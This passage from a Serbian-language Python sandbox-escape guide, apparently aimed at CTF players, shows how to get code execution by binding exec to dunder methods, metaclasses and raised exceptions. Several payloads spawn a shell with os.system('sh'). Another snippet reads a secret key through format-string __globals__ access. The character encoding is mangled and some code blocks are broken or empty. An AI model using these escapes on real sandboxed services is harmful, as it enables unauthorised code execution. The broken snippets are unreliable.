### RCE kreiranje objekata i preoptereƒáenje

#### RCE sa prilagoƒëenim klasama

Mo≈æete modifikovati neke **metode klase** (_prepisivanjem postojeƒáih metoda klase ili kreiranjem nove klase_) kako biste ih naterali da **izvr≈°e proizvoljan kod** kada budu **pokrenuti** bez direktnog pozivanja.

def __del__(self):

__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

#### Kreiranje objekata pomoƒáu [metaklasa](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Kljuƒçna stvar koju nam metaklase omoguƒáavaju je **kreiranje instance klase, bez direktnog pozivanja konstruktora**, tako ≈°to se kreira nova klasa sa ciljnom klasom kao metaklasom.

```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```

#### Kreiranje objekata sa izuzecima

Kada se **izuzetak pokrene**, objekat **Exception** se **kreira** bez potrebe da direktno pozivate konstruktor (triik od [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):

```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```

## Python Format String

Ako **po≈°aljete** **string** u python koji ƒáe biti **formatiran**, mo≈æete koristiti `{}` da pristupite **internim informacijama pythona**. Mo≈æete koristiti prethodne primere da pristupite globalnim ili ugraƒëenim funkcijama na primer.

{% hint style="info" %}
Meƒëutim, postoji **ograniƒçenje**, mo≈æete koristiti samo simbole `.[]`, tako da **neƒáete moƒái izvr≈°iti proizvoljni kod**, veƒá samo ƒçitati informacije.\
_**Ako znate kako izvr≈°iti kod putem ove ranjivosti, molim vas kontaktirajte me.**_
{% endhint %}

```python

CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:

self.lname = lname

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"

```

Zapa≈æeno je kako mo≈æete **pristupiti atributima** na uobiƒçajen naƒçin sa **taƒçkom** poput `people_obj.__init__` i **elementima reƒçnika** sa **zagradama** bez navodnika `__globals__[CONFIG]`

Takoƒëe, mo≈æete koristiti `.__dict__` za enumeraciju elemenata objekta `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Neke druge zanimljive karakteristike formatiranja stringova su moguƒánost **izvr≈°avanja** funkcija **`str`**, **`repr`** i **`ascii`** u naznaƒçenom objektu dodavanjem **`!s`**, **`!r`**, **`!a`** redom:

```python

```

## Kompajliranje Pythona

Sada zamislimo da na neki naƒçin mo≈æete **izvuƒái informacije o funkciji koju ne mo≈æete izvr≈°iti**, ali je **morati** **izvr≈°iti**.\
Kao u sledeƒáem primeru, **mo≈æete pristupiti objektu koda** te funkcije, ali samo ƒçitanjem disasemblera **ne znate kako izraƒçunati zastavu** (_zamislite slo≈æeniju funkciju `calc_flag`_).

```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
